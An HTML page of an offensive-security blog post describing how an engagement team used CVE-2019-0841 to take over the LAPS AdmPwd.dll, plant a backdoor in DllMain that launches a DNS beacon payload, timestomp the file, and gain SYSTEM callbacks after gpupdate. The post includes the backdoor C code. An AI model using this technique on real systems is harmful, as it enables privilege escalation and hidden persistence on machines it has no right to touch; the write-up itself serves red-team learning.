<!DOCTYPE html>
<html><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Offensive Security Engineering &amp; Shenanigans">
    <meta name="Author" content="Rasta Mouse">
    <meta name="keywords" content="offensive security red team pentesting">
    <link rel="stylesheet" href=https://rastamouse.me/css/syntax.css>
    <link rel="stylesheet" href=https://rastamouse.me/css/style.css>
    <script src="https://kit.fontawesome.com/1b7478c139.js" crossorigin="anonymous"></script>
    <title>Cheesy Rumbles</title>
  </head><body><aside id="sidenav">
    <header>
    
        <a href=https://rastamouse.me><img src="https://rastamouse.me/avatar.png" alt="avatar"></a>
        
    

    <a id="branding" href=https://rastamouse.me>
        
            Cheesy Rumbles
        
    </a>
    </header>

    <nav>
        
            		
            <a href="/"
                
            >
                <i class="fas fa-home fa-sm"></i>
                <span>home</span>
            </a>
        
            		
            <a href="/blog/"
                
            >
                <i class="fas fa-keyboard fa-ms"></i>
                <span>blog</span>
            </a>
        
            		
            <a href="/tags"
                
            >
                <i class="fas fa-tags fa-ms"></i>
                <span>tags</span>
            </a>
        
            		
            <a href="https://twitter.com/_RastaMouse"
                
                    target="_blank"
                
            >
                <i class="fab fa-twitter fa-ms"></i>
                <span>twitter</span>
            </a>
        
            		
            <a href="https://github.com/rasta-mouse"
                
                    target="_blank"
                
            >
                <i class="fab fa-github fa-ms"></i>
                <span>github</span>
            </a>
        
            		
            <a href="/index.xml"
                
            >
                <i class="fas fa-rss fa-ms"></i>
                <span>RSS</span>
            </a>
        
    </nav>
</aside>
<main id="main">
            <a href="javascript:void(0)" id="closebtn" onclick="navToggle()"><i class="fas fa-bars fa-lg"></i></a>
            <div class="content">
    
    <h1 id="title">Weaponizing CVE-2019-0841 with LAPS</h1>
    
      
    <nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li><a href="#foothold">Foothold</a></li>
        <li><a href="#exploit-cve-2019-0841">Exploit CVE-2019-0841</a></li>
        <li><a href="#admpwddll">AdmPwd.dll</a></li>
        <li><a href="#timestomp">Timestomp</a></li>
      </ul>
    </li>
    <li><a href="#gpupdate">GPUpdate</a></li>
  </ul>
</nav>
    <p>On April 9, <a href="https://twitter.com/rogue_kdc">Nabeel Ahmed</a> <a href="https://twitter.com/rogue_kdc/status/1115664188821639173">annouced</a> details of <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-0841">CVE-2019-0841</a> - the tl;dr being that it allows low privileged users to take Full Control of files owned by <code>NT AUTHORITY\SYSTEM</code>, which can lead to EoP.  Nabeel published a comprehensive <a href="https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/">blog</a> describing the vulnerability, <a href="https://github.com/rogue-kdc">PoC code</a> and a <a href="https://youtu.be/vP468ZjJ3hU">video demonstration</a>.</p>
<p>The video shows a low priv user taking control of <code>psmachine.dll</code> and popping a <code>SYSTEM</code> shell via the Google Chrome Update Service.  However, the PoC code only goes as far as taking control of the target file, meaning we have to complete the weaponization ourselves (which is no bad thing).  I was working with <a href="https://twitter.com/_RythmStick">RythmStick</a> on a small engagement, so we decided to give it a go.</p>
<p>We quickly reproduced the Google Update Service takeover on a test system and verified we could pop shells.  Our target machines did have Chrome installed but the update service was disabled, so the modified DLL would not fire.  RythmStick went off in search of other candidates that we could use and eventually mentioned LAPS.</p>
<p>We <a href="https://rastamouse.me/2018/03/laps-part-2/">already know</a> some ways in which we can abuse the LAPS <code>AdmPwd.dll</code>, but this time we created a DLL that would actually spawn us some shellz.</p>
<h3 id="foothold">Foothold</h3>
<p>In our little walkthrough there, we have an HTTP Beacon running as a low priv user.  This user is not a local admin.</p>
<figure>
    <img src="/images/cve-2019-0841/foothold.png"/> 
</figure>

<p>First, let&rsquo;s verify the DACL on <code>AdmPwd.dll</code> to demonstrate that we don&rsquo;t currently have control over it.</p>
<figure>
    <img src="/images/cve-2019-0841/acl-before.png"/> 
</figure>

<h3 id="exploit-cve-2019-0841">Exploit CVE-2019-0841</h3>
<p>Nabeel&rsquo;s PoC is written in C, so we have to upload it to the target to run.</p>
<p><figure>
    <img src="/images/cve-2019-0841/upload.png"/> 
</figure>

<figure>
    <img src="/images/cve-2019-0841/cve.png"/> 
</figure>
</p>
<p>Checking the DACL a second time, we verify that we have now indeed got control over that file.</p>
<figure>
    <img src="/images/cve-2019-0841/acl-after.png"/> 
</figure>

<h3 id="admpwddll">AdmPwd.dll</h3>
<p>You can place the backdoor pretty much anywhere you like inside <code>AdmPwd.dll</code>, depending on the conditions under which you want it to trigger.  We opted to slide it into <code>DllMain</code> so it would run on each <code>gpupdate</code>, though I think putting it inside the password reset block would be a more interesting long haul persistence mechanism.</p>
<p>And because I suck at <code>C</code>, I just did a very simple <code>CreateProcess</code> that would run a customised <a href="https://github.com/rasta-mouse/TikiTorch">TikiTorch</a> payload from disk.  This contains a stageless DNS Beacon payload.</p>
<div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">Backdoor</span><span class="p">()</span>
<span class="p">{</span>
	<span class="n">STARTUPINFO</span> <span class="n">sInfo</span><span class="p">;</span>
	<span class="n">PROCESS_INFORMATION</span> <span class="n">pInfo</span><span class="p">;</span>

	<span class="n">RtlSecureZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sInfo</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sInfo</span><span class="p">));</span>
	<span class="n">RtlSecureZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pInfo</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pInfo</span><span class="p">));</span>
	<span class="n">sInfo</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">sInfo</span><span class="p">);</span>

	<span class="n">GetStartupInfoW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">sInfo</span><span class="p">);</span>

	<span class="n">CreateProcess</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">Tasks</span><span class="se">\\</span><span class="s">TikiSpawn.exe&#34;</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="sa">L</span><span class="s">&#34;C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32&#34;</span><span class="p">,</span>
		<span class="o">&amp;</span><span class="n">sInfo</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pInfo</span><span class="p">);</span>

	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">pInfo</span><span class="p">.</span><span class="n">hProcess</span><span class="p">);</span>
	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">pInfo</span><span class="p">.</span><span class="n">hThread</span><span class="p">);</span>

	<span class="k">return</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-C" data-lang="C"><span class="c1">//DllMain, Installation, Uninstallation
</span><span class="c1"></span><span class="n">BOOL</span> <span class="n">APIENTRY</span> <span class="nf">DllMain</span><span class="p">(</span> <span class="n">HANDLE</span> <span class="n">hModule</span><span class="p">,</span> <span class="n">DWORD</span>  <span class="n">ul_reason</span><span class="p">,</span> <span class="n">LPVOID</span> <span class="n">lpReserved</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">if</span><span class="p">(</span><span class="n">ul_reason</span><span class="o">==</span><span class="n">DLL_PROCESS_ATTACH</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">Backdoor</span><span class="p">();</span>
		<span class="n">hDll</span><span class="o">=</span><span class="p">(</span><span class="n">HINSTANCE</span><span class="p">)</span><span class="n">hModule</span><span class="p">;</span>
	<span class="p">}</span>
    <span class="k">return</span> <span class="n">TRUE</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>Overwriting the DLL is as simple as <code>cd</code>ing into <code>C:\Program Files\LAPS\CSE</code> and <code>upload</code>ing the new one.</p>
<figure>
    <img src="/images/cve-2019-0841/upload2.png"/> 
</figure>

<h3 id="timestomp">Timestomp</h3>
<p>As a bit of a bonus, you can also <code>timestomp</code> the DLL back to something that looks more reasonable.  If the LAPS UI is also installed, timestomping to <code>AdmPwd.Utils.dll</code> seemed to work well.</p>
<p><figure>
    <img src="/images/cve-2019-0841/timestomp-before.png"/> 
</figure>

<figure>
    <img src="/images/cve-2019-0841/timestomp-after.png"/> 
</figure>
</p>
<p>Note that <code>04/13/2019</code> on the <code>CSE</code> directory is the date of the LAPS installation.</p>
<h2 id="gpupdate">GPUpdate</h2>
<p>After a gpupdate, we get a DNS Beacon.</p>
<p><figure>
    <img src="/images/cve-2019-0841/beacon-initial.png"/> 
</figure>

<figure>
    <img src="/images/cve-2019-0841/beacon-checkin.png"/> 
</figure>
</p>
<p>This is how the Beacon looks in Process Explorer.  It seems there are some nuances when messing with processes as <code>SYSTEM</code> that meant I couldn&rsquo;t immediately get PPID&rsquo;ing to work.  Maybe that&rsquo;s for another day.</p>
<figure>
    <img src="/images/cve-2019-0841/process-explorer.png"/> 
</figure>

<p>And after a number of hours, we have a bunch of Beacons.</p>
<figure>
    <img src="/images/cve-2019-0841/later.png"/> 
</figure>
    
    <div class="nav-next-prev">
        <div class="nav-prev">
            
                <a href="https://rastamouse.me/blog/ews/"><i class="fas fa-chevron-left"></i></a>
            
        </div>
        <a class="nav-top" href="#">top</i></a>
        <div class="nav-next">
            
                <a href="https://rastamouse.me/blog/collector-service/"><i class="fas fa-chevron-right"></i></a>
            
        </div>
    </div>
    

            </div><footer>
<div class="footer-content">


<p class="copyright meta">This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.</p>

</div>
</footer></main>
    </body>
    <script src=https://rastamouse.me/js/navbutton.js></script>
</html>
